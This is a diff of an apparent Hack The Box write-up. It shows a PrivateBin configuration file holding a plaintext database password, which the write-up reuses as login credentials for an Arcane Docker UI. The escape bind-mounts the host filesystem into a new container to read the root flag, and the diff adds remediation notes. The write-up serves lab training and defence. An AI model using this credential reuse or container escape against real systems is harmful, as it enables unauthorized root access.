-[formatter_options]
-; Set available formatters, their order and their labels
-plaintext = "Plain Text"
-syntaxhighlighting = "Source Code"
-markdown = "Markdown"
-
-[traffic]
-; time limit between calls from the same IP address in seconds
-; Set this to 0 to disable rate limiting.
-limit = 10
-
-; (optional) Set IPs addresses (v4 or v6) or subnets (CIDR) which are exempted
-; from the rate-limit. Invalid IPs will be ignored. If multiple values are to
-; be exempted, the list needs to be comma separated. Leave unset to disable
-; exemptions.
-; exempted = "1.2.3.4,10.10.10/24"
-
-; (optional) If you want only some source IP addresses (v4 or v6) or subnets
-; (CIDR) to be allowed to create documents, set these here. Invalid IPs will be
-; ignored. If multiple values are to be exempted, the list needs to be comma
-; separated. Leave unset to allow anyone to create documents.
-; creators = "1.2.3.4,10.10.10/24"
-
-; (optional) if your website runs behind a reverse proxy or load balancer,
-; set the HTTP header containing the visitors IP address, i.e. X_FORWARDED_FOR
-; header = "X_FORWARDED_FOR"
-
-[purge]
-; minimum time limit between two purgings of expired documents, it is only
-; checked when documents get created
-; Set this to 0 to run a purge every time a document is created.
-limit = 300
-
-; maximum amount of expired documents to delete in one purge
-; Set this to 0 to disable purging. Set it higher, if you are running a large
-; site
-batchsize = 10
-
-[model]
-; name of data model class to load and directory for storage
-; the default model "Filesystem" stores everything in the filesystem
-class = Filesystem
-[model_options]
-dir = PATH "data"
-
-;[model]
-; example of a Google Cloud Storage configuration
-;class = GoogleCloudStorage
-;[model_options]
-;bucket = "my-private-bin"
-;prefix = "pastes"
-;uniformacl = false
-
-[model]
-; example of DB configuration for MySQL
 ; Temporarily disabling while we migrate to new server for loadbalancing
-;class = Database
 [model_options]
 dsn = "mysql:host=localhost;dbname=privatebin;charset=UTF8"
-tbl = "privatebin_"    ; table prefix
+tbl = "privatebin_"
 usr = "privatebin"
 pwd = "ComplexP@sswordAdmin1928"
-opt[12] = true   ; PDO::ATTR_PERSISTENT
-
-;[model]
-; example of DB configuration for SQLite
-;class = Database
-;[model_options]
-;dsn = "sqlite:" PATH "data/db.sq3"
-;usr = null
-;pwd = null
-;opt[12] = true ; PDO::ATTR_PERSISTENT
-
-;[model]
-; example of DB configuration for PostgreSQL
-;class = Database
-;[model_options]
-;dsn = "pgsql:host=localhost;dbname=privatebin"
-;tbl = "privatebin_"     ; table prefix
-;usr = "privatebin"
-;pwd = "Z3r0P4ss"
-;opt[12] = true    ; PDO::ATTR_PERSISTENT
-
-;[model]
-; example of S3 configuration for Rados gateway / CEPH
-;class = S3Storage
-;[model_options]
-;region = ""
-;version = "2006-03-01"
-;endpoint = "https://s3.my-ceph.invalid"
-;use_path_style_endpoint = true
-;bucket = "my-bucket"
-;accesskey = "my-rados-user"
-;secretkey = "my-rados-pass"
-
-;[model]
-; example of S3 configuration for AWS
-;class = S3Storage
-;[model_options]
-;region = "eu-central-1"
-;version = "latest"
-;bucket = "my-bucket"
-;accesskey = "access key id"
-;secretkey = "secret access key"
-
-;[model]
-; example of S3 configuration for AWS using its SDK default credential provider chain
-; if relying on environment variables, the AWS SDK will look for the following:
-; - AWS_ACCESS_KEY_ID
-; - AWS_SECRET_ACCESS_KEY
-; - AWS_SESSION_TOKEN (if needed)
-; for more details, see https://docs.aws.amazon.com/sdk-for-php/v3/developer-guide/guide_credentials.html#default-credential-chain
-;class = S3Storage
-;[model_options]
-;region = "eu-central-1"
-;version = "latest"
-;bucket = "my-bucket"
-
-;[shlink]
-; - Shlink requires you to make a post call with a generated API key.
-;   use this section to setup the API key and URL. In order to use this section,
-;   "urlshortener" needs to point to the base URL of your PrivateBin
-;   instance with "?shortenviashlink&link=" appended. For example:
-;   urlshortener = "${basepath}?shortenviashlink&link="
-;   This URL will in turn call Shlink on the server side, using the URL from
-;   "apiurl" and the API Key from the "apikey" parameters below.
-; apiurl = "https://shlink.example.com/rest/v3/short-urls"
-; apikey = "your_api_key"
-
-;[yourls]
-; When using YOURLS as a "urlshortener" config item:
-; - By default, "urlshortener" will point to the YOURLS API URL, with or without
-;   credentials, and will be visible in public on the PrivateBin web page.
-;   Only use this if you allow short URL creation without credentials.
-; - Alternatively, using the parameters in this section ("signature" and
-;   "apiurl"), "urlshortener" needs to point to the base URL of your PrivateBin
-;   instance with "?shortenviayourls&link=" appended. For example:
-;   urlshortener = "${basepath}?shortenviayourls&link="
-;   This URL will in turn call YOURLS on the server side, using the URL from
-;   "apiurl" and the "access signature" from the "signature" parameters below.
-
-; (optional) the "signature" (access key) issued by YOURLS for the using account
-; signature = ""
-; (optional) the URL of the YOURLS API, called to shorten a PrivateBin URL
-; apiurl = "https://yourls.example.com/yourls-api.php"
-
-;[sri]
-; Subresource integrity (SRI) hashes used in template files. Uncomment and set
-; these for all js files used. See:
-; https://github.com/PrivateBin/PrivateBin/wiki/FAQ#user-content-how-to-make-privatebin-work-when-i-have-changed-some-javascript-files
-;js/privatebin.js = "sha512-[…]"
-
 ```
 
-arcane:ComplexP@sswordAdmin1928
+Credentials recovered: `arcane:ComplexP@sswordAdmin1928`
 
-These credentials grant access to the arcane instance.
+### Docker Container Escape via Arcane
 
-IMAGE 5
+These credentials grant access to the Arcane instance on port 3552.
 
-A new container can be created and used to import the whole file system as root
+Mostra immagine
 
-IMAGE 6
+Arcane is a Docker management UI. A new container is created with the host filesystem bind-mounted at `/mnt/host`, using a privileged image. This gives root-level read access to the entire host filesystem from within the container.
 
-IMAGE 7
+Mostra immagine
 
-IMAGE 8
+Mostra immagine
+
+Mostra immagine
+
+```
+root@<container-id>:/# cat /mnt/host/root/root.txt
+<root_flag>
+```
 
 ---
+
 ## Remediation
 
-- Key takeaway 1
-- Key takeaway 2
-- Key takeaway 3
+- **MCPJam RCE (GHSA-232v-j27c-5pp6):** Upgrade MCPJam to a version beyond v1.4.2. Bind the inspector to `127.0.0.1` and enforce authentication on the `/api/mcp/connect` endpoint.
+- **World-writable data directories:** Restrict write permissions on PrivateBin's data subdirectories. The `operator` group should not have write access to paths served by the web server.
+- **Template cookie path traversal:** Sanitize and whitelist the `template` cookie value to prevent directory traversal outside the `tpl/` directory.
+- **Plaintext credentials in config files:** Remove credentials from configuration files once they are no longer in use. Use secret management tooling (e.g. environment variables, Vault) instead of hardcoded values.
+- **Arcane / Docker socket exposure:** Restrict access to the Docker management UI to trusted networks or authenticated users only. Avoid exposing the Docker socket or management interfaces to accounts or services that don't require it.
 
 ---
+
 ## References
 
-- [Reference 1](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)
-- [Reference 2](https://github.com/momenbasel/htb-writeups/blob/main/templates/url)
+- [GHSA-232v-j27c-5pp6 — MCPJam RCE](https://github.com/advisories/GHSA-232v-j27c-5pp6)
+- [GTFOBins — Docker](https://gtfobins.github.io/gtfobins/docker/)
+- [PrivateBin Configuration Reference](https://github.com/PrivateBin/PrivateBin/wiki/Configuration)
